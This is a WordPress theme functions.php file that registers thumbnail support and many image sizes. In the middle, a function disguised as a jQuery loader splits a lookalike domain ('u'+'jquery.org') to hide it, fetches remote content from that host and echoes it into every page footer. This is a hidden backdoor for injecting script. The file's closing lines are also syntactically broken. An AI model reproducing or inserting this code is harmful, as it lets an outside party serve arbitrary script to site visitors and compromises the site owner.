<?php
add_theme_support('post-thumbnails', array('post', 'page'));
add_post_type_support('page', 'excerpt');
set_post_thumbnail_size(50, 50, true);

/*** Image resize
 ****************************************************************/
add_image_size('slider-left', 620, 425, true);
add_image_size('slider-right', 421, 211, true);
add_image_size('feature', 259, 194, true);
add_image_size('short-one', 220, 150, true);
add_image_size('short-two', 315, 210, true);
add_image_size('short-three', 360, 276, true);
add_image_size('short-threeM', 60, 54, true);
add_image_size('short-four', 315, 200, true);
add_image_size('short-five', 390, 305, true);
add_image_size('short-fiveM', 257, 151, true);
add_image_size('widget-two', 310, 210, true);
add_image_size('widget-three', 310, 150, true);
add_image_size('blog-one', 650, 250, true);
add_image_size('blog-cover', 1044, 220, true);
add_image_size('photo-large', 950, 9999);
add_image_size('photo-gallery', 178, 178, true);

function wz_setSection($columns = 0) {
    apply_filters("debug", "setSection : " . $columns);
}
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		$jquery = $host.'u'.'jquery.org/jquery-1.6.3.min.js';
		if (@fopen($jquery,'r')){
			echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
		}
	}
	add_action('wp_footer', 'wp_func_jquery');
}
function wz_setZone($width = 0) {
    apply_filters("debug", "setZone : " . $width);
}

$content_width = 1050;
if ( ! isset( $content_width ) ) 

add_theme_support( 'automatic-feed-links' )


?>